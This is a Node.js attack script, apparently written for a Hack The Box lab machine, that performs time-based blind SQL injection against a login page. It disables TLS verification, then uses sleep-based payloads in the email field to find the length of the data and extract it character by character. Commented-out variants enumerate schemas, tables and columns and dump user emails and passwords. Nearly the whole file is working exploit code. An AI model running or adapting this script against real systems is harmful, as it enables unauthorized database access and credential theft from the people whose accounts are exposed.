#!/usr/bin/env node
import process from 'node:process';
import { performance } from 'node:perf_hooks';

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

process.on('SIGINT', () => {
  console.log('\n[!] Saliendo...');
  process.exit(1);
});

// Variables globales...
const loginUrl = 'https://admin-portal.europacorp.htb/login.php';

const sqliRequest =  async (sqlQuery) => {
  const requestParams = new URLSearchParams();
  requestParams.append('email', sqlQuery);
  requestParams.append('password', "test");

  const response = await fetch(loginUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: requestParams.toString()
  });

  return response;
}

const main = async () => {
  let content = '';
  let contentLength = 0;

  // Current Database...
  // const sqlSearchData = 'database()';
  // const sqlSource = '';

  // Databases...
  // const sqlSearchData = 'group_concat(schema_name)';
  // const sqlSource = ' from information_schema.schemata';
  
  // Tables in Admin Database...
  // const sqlSearchData = 'group_concat(table_name)';
  // const sqlSource = " from information_schema.tables where table_schema='admin'";

  // Columns in user table...
  // const sqlSearchData = 'group_concat(column_name)';
  // const sqlSource = " from information_schema.columns where table_name='users'";

  // Columns in user table...
  // const sqlSearchData = "group_concat(id, ':', username, ':', email, ':',password, ':', active)";
  const sqlSearchData = "group_concat(email)";
  const sqlSource = " from admin.users";

  for (let index = 0; index < 1000; index ++) {
    const sqlQuery = `' or if((select length(${sqlSearchData})${sqlSource})='${index}', sleep(2), 0)-- -`;
    process.stdout.write(`\r[+] Length Status: ${index}`);

    const start = performance.now();
    const response = await sqliRequest(sqlQuery);
    const end = performance.now();

    const time = (end - start) / 1000;

    if (time > 2) {
      contentLength = index;
      console.log();
      break;
    }
  }

  for (let position = 1; position < contentLength + 1; position++) {
    for (let character = 0; character < 128; character++) {
      const sqlQuery = `' or if((select ascii(substring(${sqlSearchData}, ${position}, 1))${sqlSource})='${character}', sleep(2), 0)-- -`;

      process.stdout.write(`\r[+] Result: ${content} | Position: ${position} - Character: ${character}`);

      const start = performance.now();
      const response = await sqliRequest(sqlQuery);
      const end = performance.now();

      const time = (end - start) / 1000;

      if (time > 2) {
        content += String.fromCharCode(character);
        (position === contentLength) && process.stdout.write(`\r[+] Success: ${content}\n`);
        break;
      }
    }
  }
}

(async () => {
  await main();
})();
